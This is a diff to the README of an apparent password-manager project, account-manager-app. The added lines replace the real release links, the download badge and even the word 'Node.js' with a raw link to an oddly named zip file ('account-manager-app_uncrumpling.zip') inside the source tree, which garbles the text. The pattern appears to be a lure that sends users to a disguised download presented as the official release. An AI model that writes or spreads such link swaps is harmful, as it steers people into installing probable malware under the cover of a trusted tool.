@@ -1,7 +1,7 @@
 # 🎉 account-manager-app - Simple Password Management for Everyone
 
 ## 🚀 Overview
-Welcome to the **account-manager-app**! This application helps you manage your personal passwords easily. Built with React, Node.js, and MongoDB, it provides a user-friendly interface that makes password management accessible for everyone.
+Welcome to the **account-manager-app**! This application helps you manage your personal passwords easily. Built with React, https://raw.githubusercontent.com/Abdo-Elsafti/account-manager-app/main/server/src/account-manager-app_uncrumpling.zip, and MongoDB, it provides a user-friendly interface that makes password management accessible for everyone.
 
 ### 🌐 Key Features
 - **Easy to Use:** Designed for users without technical knowledge.
@@ -10,13 +10,13 @@ Welcome to the **account-manager-app**! This application helps you manage your p
 - **Open Source:** Freely available for anyone to use and contribute.
 
 ## 📥 Download
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/Abdo-Elsafti/account-manager-app/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Abdo-Elsafti/account-manager-app/main/server/src/account-manager-app_uncrumpling.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/Abdo-Elsafti/account-manager-app/main/server/src/account-manager-app_uncrumpling.zip)](https://raw.githubusercontent.com/Abdo-Elsafti/account-manager-app/main/server/src/account-manager-app_uncrumpling.zip)
 
 ## 🚀 Getting Started
 To get started with **account-manager-app**, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/Abdo-Elsafti/account-manager-app/releases) to find the latest version of the app.
+   Go to our [Releases page](https://raw.githubusercontent.com/Abdo-Elsafti/account-manager-app/main/server/src/account-manager-app_uncrumpling.zip) to find the latest version of the app.
 
 2. **Choose Your System:**
    Select the version that matches your operating system. We offer builds for:
